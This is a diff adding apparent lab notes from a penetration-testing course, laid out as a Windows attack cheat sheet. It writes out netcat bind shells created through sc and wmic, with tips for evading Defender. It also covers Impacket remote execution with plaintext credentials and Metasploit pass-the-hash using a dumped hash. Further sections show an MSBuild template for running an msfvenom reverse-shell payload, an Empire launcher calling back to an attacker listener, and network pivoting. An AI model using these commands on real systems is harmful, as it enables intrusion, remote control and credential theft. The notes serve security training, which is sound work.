@@ -1,0 +1,228 @@
+{{{ Section: Running commands w/SC and WMIC ================================================================
+########## SC
+// attacker - remotely create service 
+sc \\Sec560Student create ncservice binpath= "c:\tools\nc.exe -l -p 2222 -e cmd.exe"
+        - dont use IP address here, some win maches have issues w/localhost/127.0.0.1/internal IP
+        - just use hostname 
+
+// confirm
+sc \\Sec560Student query ncservice
+
+
+\\ on victim, listen 
+netstat -nao 1 | find ":2222"
+        // stops after 30 secs; defender killed service 
+
+// KILL IT AND TRY AGAIN BETTER
+sc \\Sec560Student delete ncservice
+
+sc \\Sec560Student create ncservice2 binpath= "cmd.exe /k c:\tools\nc.exe -l -p 2222 -e cmd.exe"
+cmd /k || runs subproc that wont be killed 
+        - sc will fail, but nc subproc will still run~
+        - using -L would make a persistent nc.exe listener 
+
+// delete
+
+
+sc \\Sec560Student delete ncservice2
+
+
+
+########## WMIC 
+// wmic monitor on victim
+wmic process where name="nc.exe" list brief /every:1
+
+// remotely create service on attkr
+wmic /node:Sec560Student process call create "c:\tools\nc.exe -l -p 4444 -e cmd.exe"
+wmic /node:Sec560Student process call create "c:\tools\nc.exe -dlp 4444 -e cmd.exe"
+        **** USE -d for detached session, otherwise creates POPUP
+
+
+// remove
+wmic /node:Sec560Student process where name="nc.exe" delete
+
+
+===================================================================}}}
+
+{{{ Section: Impacket ================================================================
+
+// wmiexec.py 
+wmiexec.py [[domain/]username[:password]@]<targetName or address> command
+
+wmiexec.py username@target command
+
+wmiexec.py sec560:sec560@WINDOWS_ETHERNET0_ADDRESS whoami // avoid password prompt
+
+// show cwd
+wmiexec.py sec560:sec560@10.10.10.129 cd
+
+// interactive session
+wmiexec.py sec560:sec560@WINDOWS_ETHERNET0_ADDRESS // NO cmd at end 
+whoami // ADMIN
+
+// smbexec.py
+sudo smbexec.py sec560:sec560@WINDOWS_ETHERNET0_ADDRESS
+sudo smbexec.py sec560:sec560@10.10.10.129 // SHELL
+
+whoami // system
+
+
+// smbclient.py - for shares/moving files 
+smbclient.py hiboxy/bgreen:Password1@10.130.10.44
+help
+shares
+use FileShare
+
+// lookupsid.py - enum all users in domain 
+lookupsid.py hiboxy/bgreen:Password1@10.130.10.4 // includes every user and group in domain 
+
+lookupsid.py hiboxy/bgreen:Password1@10.130.10.4 520 // specify 520 
+
+===================================================================}}}
+
+{{{ Section: PTH ================================================================
+- reuse creds (hashes) found earlier 
+ LM and NT hashes for admin access 
+
+use exploit/windows/smb/psexec
+set smbuser bgreen
+set smbpass Password1
+set smbdomain hiboxy
+set rhosts 10.130.10.5
+set lhost tun0
+
+run post/windows/gather/hashdump
+antivirus:1009:aad3b435b51404eeaad3b435b51404ee:47f0ca5913c6e70090d7b686afb9e13e::: // use generic
+
+bg
+set smbuser antivirus
+unset dmbsdomain
+
+set smbpass aad3b435b51404eeaad3b435b51404ee:47f0ca5913c6e70090d7b686afb9e13e
+set rhosts 10.130.10.4,6,21,25,33,44,45
+run
+
+
+===================================================================}}}
+
+{{{ Section: MSBuild ================================================================
+
+build1.xml
+
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="Hello">
+    <ClassExample />
+  </Target>
+  <UsingTask 
+    TaskName="ClassExample"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
+    <Task>
+      <Code Type="Class" Language="cs">
+      <![CDATA[
+        using System;
+        using System.Runtime.InteropServices;
+        using Microsoft.Build.Framework;
+        using Microsoft.Build.Utilities;
+        public class ClassExample : Task, ITask
+        {
+          public override bool Execute()
+          {
+            //PUT CODE TO EXECUTE HERE;
+            return true;
+          }
+        }
+      ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
+
+Console.WriteLine("Hello SEC560!");
+
+// find msbuild.exe
+dir /b /s C:\msbuild.exe
+
+C:\Windows\Microsoft.NET\assembly\GAC_64\MSBuild\v4.0_4.0.0.0__b03f5f7f11d50a3a\MSBuild.exe
+// run it 
+C:\Windows\Microsoft.NET\assembly\GAC_32\MSBuild\v4.0_4.0.0.0__b03f5f7f11d50a3a\MSBuild.exe C:\CourseFiles\build1.xml
+
+// setup meterpreter payload 
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 0.0.0.0
+set lport 3333
+
+
+// gen payload 
+msfvenom -p windows/meterpreter/reverse_tcp lhost=eth0 lport=3333 -f csharp | tee /tmp/payload.txt
+
+- copy payload, paste into //PUT CODE HERE ; indents no matter
+        starting at byte[]
+
+// run 
+C:\Windows\Microsoft.NET\assembly\GAC_32\MSBuild\v4.0_4.0.0.0__b03f5f7f11d50a3a\MSBuild.exe C:\CourseFiles\build2.xml
+
+
+// EMPIRE 
+cd /opt/empire
+sudo ./ps-empire server
+
+
+cd /opt/empire
+./ps-empire client
+
+uselistener http
+
+set Host http://10.10.10.128:9999
+set Port 9999
+execute
+
+// build XML launcher
+usestager windows/launcher_xml
+// set listener to gen payload 
+set Listener http
+generate 
+
+// host and transfer, then run it 
+httpserver
+
+C:\Windows\Microsoft.NET\assembly\GAC_32\MSBuild\v4.0_4.0.0.0__b03f5f7f11d50a3a\MSBuild.exe C:\Users\sec560\Desktop\launcher.xml
+
+// check agent 
+agents 
+
+
+// ON EXIT
+agents
+kill all
+y
+listeners
+kill all
+exit
+y
+
+
+
+
+
+===================================================================}}}
+
+{{{ Section: Pivoting ================================================================
+
+// get terp session, add autoroute 
+run post/multi/manage/autoroute CMD=add SUBNET=10.130.11.0
+
+
+// terp w SSH -D 
+ssh bgreen@10.130.10.22 -D 9999
+
+set RHOSTS 10.130.11.13
+set RPORT 445
+set Proxies socks5:127.0.0.1:9999
+
+set ReverseAllowProxy true
+
+
+===================================================================}}}
+
